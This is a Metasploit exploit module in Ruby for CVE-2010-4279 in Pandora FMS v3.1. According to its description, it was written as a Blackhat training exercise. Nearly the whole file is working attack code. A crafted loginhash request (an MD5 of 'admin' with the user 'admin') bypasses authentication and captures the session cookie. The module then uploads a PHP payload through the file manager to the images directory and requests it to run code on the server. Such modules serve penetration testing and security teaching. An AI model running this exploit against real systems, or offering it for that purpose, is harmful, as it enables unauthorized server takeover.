##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper

  def initialize(info={})
    super(update_info(info,
      'Name'           => "Pandora FMS v3.1 Auth Bypass and Arbitrary File Upload Vulnerability",
      'Description'    => %q{
        This module exploits an authentication bypass vulnerability in Pandora FMS v3.1 as
        disclosed by Juan Galiana Lara. It also integrates with the built-in pandora
        upload which allows a user to upload arbitrary files to the '/images/' directory.

        This module was created as an exercise in the Metasploit Mastery Class at Blackhat
        that was facilitated by egypt and mubix.

      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Juan Galiana Lara',                         # Vulnerability discovery
          'Raymond Nunez <rcnunez[at]upd.edu.ph>',     # Metasploit module
          'Elizabeth Loyola <ecloyola[at]upd.edu.ph>', # Metasploit module
          'Fr330wn4g3 <Fr330wn4g3[at]gmail.com>',      # Metasploit module
          '_flood <freshbones[at]gmail.com>',          # Metasploit module
          'mubix <mubix[at]room362.com>',              # Auth bypass and file upload
          'egypt <egypt[at]metasploit.com>',           # Auth bypass and file upload
        ],
      'References'     =>
        [
          ['CVE', '2010-4279'],
          ['OSVDB',   '69549'],
          ['BID',   '45112']
        ],
      'Platform'       => 'php',
      'Arch'           => ARCH_PHP,
      'Targets'        =>
        [
          ['Automatic Targeting', { 'auto' => true }]
        ],
      'Privileged'     => false,
      'DisclosureDate' => "Nov 30 2010",
      'DefaultTarget'  => 0))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The path to the web application', '/pandora_console/']),
      ], self.class)
  end

  def check

    base  = target_uri.path

    # retrieve software version from login page
    begin
      res = send_request_cgi({
        'method' => 'GET',
        'uri'    => normalize_uri(base, 'index.php')
      })
      if res and res.code == 200
        #Tested on v3.1 Build PC100609 and PC100608
        if res.body.include?("v3.1 Build PC10060")
          return Exploit::CheckCode::Appears
        elsif res.body.include?("Pandora")
          return Exploit::CheckCode::Detected
        end
      end
      return Exploit::CheckCode::Safe
    rescue ::Rex::ConnectionError
      vprint_error("Connection failed")
    end
    return Exploit::CheckCode::Unknown

  end

  # upload a payload using the pandora built-in file upload
  def upload(base, file, cookies)
    data = Rex::MIME::Message.new
    data.add_part(file, 'application/octet-stream', nil, "form-data; name=\"file\"; filename=\"#{@fname}\"")
    data.add_part("Go", nil, nil, 'form-data; name="go"')
    data.add_part("images", nil, nil, 'form-data; name="directory"')
    data.add_part("1", nil, nil, 'form-data; name="upload_file"')
    data_post = data.to_s
    data_post = data_post.gsub(/^\r\n\-\-\_Part\_/, '--_Part_')

    res = send_request_cgi({
      'method'  => 'POST',
      'uri'     => normalize_uri(base, 'index.php'),
      'cookie'  => cookies,
      'ctype'   => "multipart/form-data; boundary=#{data.bound}",
      'vars_get' => {
        'sec'  => 'gsetup',
        'sec2' => 'godmode/setup/file_manager',
      },
      'data'    => data_post
    })

    register_files_for_cleanup(@fname)
    return res
  end

  def exploit

    base   = target_uri.path
    @fname = "#{rand_text_numeric(7)}.php"
    cookies = ""

    # bypass authentication and get session cookie
    res = send_request_cgi({
      'method'  => 'GET',
      'uri'     => normalize_uri(base, 'index.php'),
      'vars_get' => {
        'loginhash_data'  => '21232f297a57a5a743894a0e4a801fc3',
        'loginhash_user' => 'admin',
        'loginhash' => '1',
      },
    })

    # fix if logic
    if res and res.code == 200
      if res.body.include?("Logout")
        cookies = res.get_cookies
        print_status("Login Bypass Successful")
        print_status("cookie monster = " + cookies)
      else
        fail_with(Failure::NotVulnerable, "Login Bypass Failed")
      end
    end

    # upload PHP payload to images/[fname]
    print_status("Uploading PHP payload (#{payload.encoded.length} bytes)")
    php    = %Q|<?php #{payload.encoded} ?>|
    begin
      res = upload(base, php, cookies)
    rescue ::Rex::ConnectionError
      fail_with(Failure::Unreachable, "#{peer} - Connection failed")
    end

    if res and res.code == 200
      print_good("File uploaded successfully")
    else
      fail_with(Failure::UnexpectedReply, "#{peer} - Uploading PHP payload failed")
    end

    # retrieve and execute PHP payload
    print_status("Executing payload (images/#{@fname})")
    begin
      res = send_request_cgi({
        'method' => 'GET',
        'uri'    => normalize_uri(base, 'images', "#{@fname}")
      }, 1)
    rescue ::Rex::ConnectionError
      fail_with(Failure::Unreachable, "#{peer} - Connection failed")
    end

  end
end